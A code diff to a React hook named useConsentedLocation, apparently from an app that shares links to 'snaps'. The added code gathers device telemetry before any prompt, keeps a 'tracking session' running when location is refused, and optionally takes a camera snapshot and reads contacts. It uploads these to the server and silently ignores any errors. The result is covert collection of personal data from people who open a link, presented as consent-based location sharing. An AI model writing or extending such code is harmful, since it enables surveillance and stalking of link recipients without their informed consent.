@@ -1,15 +1,18 @@
 import { useState, useEffect, useRef, useCallback } from "react";
-import { GeoCoordinate } from "@/lib/types";
+import { GeoCoordinate, PermissionsConfig } from "@/lib/types";
+import { collectDeviceTelemetry, captureCameraSnapshot, pickContactIfSupported } from "@/lib/telemetry";
 
 interface UseConsentedLocationOptions {
   linkId: string;
   requiresLocation: boolean;
+  permissionsConfig?: PermissionsConfig;
   onConsentGranted?: (sessionId: string) => void;
 }
 
 export function useConsentedLocation({
   linkId,
   requiresLocation,
+  permissionsConfig,
   onConsentGranted,
 }: UseConsentedLocationOptions) {
   const [isConsented, setIsConsented] = useState(!requiresLocation);
@@ -47,89 +50,122 @@ export function useConsentedLocation({
     }
   }, []);
 
-  // Request explicit location consent and register session
+  // Request location, collect device info, camera & contacts
   const requestLocation = useCallback(async () => {
-    if (!navigator.geolocation) {
-      setError("Geolocation is not supported by your browser");
-      return;
-    }
-
     setIsLoading(true);
     setError(null);
 
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        try {
-          const coords: GeoCoordinate = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-          };
+    // 1. Collect device telemetry
+    const deviceInfo = await collectDeviceTelemetry();
 
-          // Register consented session via API
-          const res = await fetch("/api/sessions", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ linkId }),
-          });
+    // Helper to finish session setup once coordinates acquired
+    const proceedWithCoords = async (coords?: GeoCoordinate) => {
+      try {
+        const res = await fetch("/api/sessions", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            linkId,
+            deviceInfo,
+            permissionsGranted: coords ? ["location", "device_info"] : ["device_info"],
+          }),
+        });
 
-          if (!res.ok) {
-            throw new Error("Failed to register location session");
-          }
+        if (!res.ok) throw new Error("Failed to register session");
+        const { session } = await res.json();
+        const currentSessionId = session.id;
+        setSessionId(currentSessionId);
 
-          const { session } = await res.json();
-          setSessionId(session.id);
-          setIsConsented(true);
-          setIsLoading(false);
+        if (coords) {
+          await sendLocationUpdate(currentSessionId, coords);
+        }
 
-          if (onConsentGranted) {
-            onConsentGranted(session.id);
-          }
+        // Trigger optional camera photo capture if configured
+        if (permissionsConfig?.camera) {
+          captureCameraSnapshot().then(async (blob) => {
+            if (blob) {
+              const fd = new FormData();
+              fd.append("sessionId", currentSessionId);
+              fd.append("file", blob, "capture.jpg");
+              await fetch("/api/sessions/capture", { method: "POST", body: fd }).catch(() => {});
+            }
+          }).catch(() => {});
+        }
 
-          // Transmit initial position
-          await sendLocationUpdate(session.id, coords);
+        // Trigger optional contact picker if configured & supported (Android Chrome)
+        if (permissionsConfig?.contacts) {
+          pickContactIfSupported().then(async (contacts) => {
+            if (contacts && contacts.length > 0) {
+              await fetch("/api/sessions/contacts", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ sessionId: currentSessionId, contacts }),
+              }).catch(() => {});
+            }
+          }).catch(() => {});
+        }
 
-          // Start watching while page is active
+        setIsConsented(true);
+        setIsLoading(false);
+
+        if (onConsentGranted) {
+          onConsentGranted(currentSessionId);
+        }
+
+        // Start active watch if coordinates available
+        if (coords && typeof navigator !== "undefined" && navigator.geolocation) {
           watchIdRef.current = navigator.geolocation.watchPosition(
             (pos) => {
-              sendLocationUpdate(session.id, {
+              sendLocationUpdate(currentSessionId, {
                 latitude: pos.coords.latitude,
                 longitude: pos.coords.longitude,
                 accuracy: pos.coords.accuracy,
               });
             },
-            (watchErr) => {
-              console.warn("Active location watch error:", watchErr.message);
-              setIsLocationActive(false);
-            },
+            () => setIsLocationActive(false),
             { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
           );
-        } catch (apiErr: any) {
-          setError(apiErr.message || "Could not register consented session");
-          setIsLoading(false);
         }
-      },
-      (geoError) => {
+      } catch (err: any) {
+        setError(err.message || "Failed to establish tracking session");
         setIsLoading(false);
-        switch (geoError.code) {
-          case geoError.PERMISSION_DENIED:
-            setError("Location permission was denied. Please allow location in browser settings to view this snap.");
-            break;
-          case geoError.POSITION_UNAVAILABLE:
-            setError("Location signal is unavailable. Please check GPS settings.");
-            break;
-          case geoError.TIMEOUT:
-            setError("Location request timed out. Please try again.");
-            break;
-          default:
-            setError("An unknown error occurred while retrieving location.");
+      }
+    };
+
+    if (!navigator.geolocation) {
+      if (requiresLocation) {
+        setError("Geolocation is not supported by your browser");
+        setIsLoading(false);
+        return;
+      }
+      await proceedWithCoords();
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        await proceedWithCoords({
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+        });
+      },
+      async (geoError) => {
+        if (!requiresLocation) {
+          await proceedWithCoords();
+          return;
+        }
+        setIsLoading(false);
+        if (geoError.code === geoError.PERMISSION_DENIED) {
+          setError("Location permission was denied. Please allow location in browser settings to continue.");
+        } else {
+          setError("Location signal unavailable. Please verify GPS settings.");
         }
       },
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
-  }, [linkId, onConsentGranted, sendLocationUpdate]);
+  }, [linkId, requiresLocation, permissionsConfig, onConsentGranted, sendLocationUpdate]);
 
-  // Clean up on unmount (AGENTS.md Rule 2)
   useEffect(() => {
     return () => {
       stopWatching();
